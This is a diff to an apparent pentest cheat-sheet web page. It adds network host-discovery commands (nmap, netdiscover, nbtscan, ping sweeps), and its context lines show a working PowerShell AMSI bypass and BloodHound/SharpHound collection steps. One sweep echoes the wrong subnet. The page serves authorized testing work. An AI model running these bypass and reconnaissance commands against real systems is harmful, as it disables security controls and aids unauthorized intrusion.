@@ -193,7 +193,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../Posts/Generate_Pentest_Report_using_Markdown/" class="md-tabs__link">
+      <a href="../../Posts/basic_av_evasion/" class="md-tabs__link">
         Posts
       </a>
     </li>
@@ -388,6 +388,13 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
+  <a href="#host-scan" class="md-nav__link">
+    Host Scan
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
   <a href="#bloodhound" class="md-nav__link">
     BloodHound
   </a>
@@ -455,8 +462,8 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Posts/Generate_Pentest_Report_using_Markdown/" class="md-nav__link">
-        Generate a Professional Penetration Test Report using Markdown and Pandoc
+      <a href="../../Posts/basic_av_evasion/" class="md-nav__link">
+        Basic Anti-Virus Evasion
       </a>
     </li>
   
@@ -920,6 +927,13 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
+  <a href="#host-scan" class="md-nav__link">
+    Host Scan
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
   <a href="#bloodhound" class="md-nav__link">
     BloodHound
   </a>
@@ -953,6 +967,28 @@ Powershell AMSI Bypass
 <div class="highlight"><pre><span></span><code><span class="no">[Ref]</span><span class="p">.</span><span class="n">Assembly</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="s1">&#39;System.Management.Automation.AmsiUtils&#39;</span><span class="p">).</span><span class="n">GetField</span><span class="p">(</span><span class="s1">&#39;amsiInitFailed&#39;</span><span class="p">,</span><span class="s1">&#39;NonPublic,Static&#39;</span><span class="p">).</span><span class="n">SetValue</span><span class="p">(</span><span class="nv">$null</span><span class="p">,</span><span class="nv">$true</span><span class="p">)</span>
 </code></pre></div></p>
 <h2 id="recon">Recon<a class="headerlink" href="#recon" title="Permanent link">&para;</a></h2>
+<h3 id="host-scan">Host Scan<a class="headerlink" href="#host-scan" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># NetDiscover (ARP Scanning):</span>
+- netdiscover -i eth0
+- netdiscover -r <span class="m">172</span>.21.10.0/24
+
+<span class="c1"># Nmap:</span>
+
+- nmap -sn <span class="m">172</span>.21.10.0/24
+- nmap -sn <span class="m">172</span>.21.10.1-253
+- nmap -sn <span class="m">172</span>.21.10.*
+
+<span class="c1"># Nbtscan: </span>
+- nbtscan -r <span class="m">172</span>.21.1.0/24
+
+<span class="c1"># Linux Ping Sweep (Bash)</span>
+
+- <span class="k">for</span> i <span class="k">in</span> <span class="o">{</span><span class="m">1</span>..254<span class="o">}</span> <span class="p">;</span><span class="k">do</span> <span class="o">(</span>ping -c <span class="m">1</span> <span class="m">172</span>.21.10.<span class="nv">$i</span> <span class="p">|</span> grep <span class="s2">&quot;bytes from&quot;</span> <span class="p">&amp;</span><span class="o">)</span> <span class="p">;</span><span class="k">done</span>
+
+<span class="c1"># Windows Ping Sweep (Run on Windows System)</span>
+
+- <span class="k">for</span> /L %i <span class="k">in</span> <span class="o">(</span><span class="m">1</span>,1,255<span class="o">)</span> <span class="k">do</span> @ping -n <span class="m">1</span> -w <span class="m">200</span> <span class="m">172</span>.21.10.%i &gt; nul <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="m">192</span>.168.1.%i is up.
+</code></pre></div>
 <h3 id="bloodhound">BloodHound<a class="headerlink" href="#bloodhound" title="Permanent link">&para;</a></h3>
 <p>Download it from <a href="https://github.com/BloodHoundAD/BloodHound">here</a>
 <div class="highlight"><pre><span></span><code><span class="c1"># /usr/lib/bloodhound/resources/app/Collectors/</span>
@@ -962,6 +998,10 @@ powershell -ep bypass
 . .<span class="se">\S</span>harpHound.ps1
 invoke-bloodhound -CollectionMethod all 
 </code></pre></div></p>
+<h1 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h1>
+<h1 id="initial-access">Initial Access<a class="headerlink" href="#initial-access" title="Permanent link">&para;</a></h1>
+<h1 id="privilege-escalation">Privilege Escalation<a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h1>
+<h1 id="lateral-movement">Lateral Movement<a class="headerlink" href="#lateral-movement" title="Permanent link">&para;</a></h1>
 <h1 id="defense-evasion">Defense Evasion<a class="headerlink" href="#defense-evasion" title="Permanent link">&para;</a></h1>
 <h2 id="bypass-amsi">Bypass AMSI<a class="headerlink" href="#bypass-amsi" title="Permanent link">&para;</a></h2>
 <ul>
@@ -1057,13 +1097,13 @@ invoke-bloodhound -CollectionMethod all
       
       
         
-        <a href="../../Posts/Generate_Pentest_Report_using_Markdown/" class="md-footer__link md-footer__link--next" aria-label="Next: Generate a Professional Penetration Test Report using Markdown and Pandoc" rel="next">
+        <a href="../../Posts/basic_av_evasion/" class="md-footer__link md-footer__link--next" aria-label="Next: Basic Anti-Virus Evasion" rel="next">
           <div class="md-footer__title">
             <div class="md-ellipsis">
               <span class="md-footer__direction">
                 Next
               </span>
-              Generate a Professional Penetration Test Report using Markdown and Pandoc
+              Basic Anti-Virus Evasion
             </div>
           </div>
           <div class="md-footer__button md-icon">
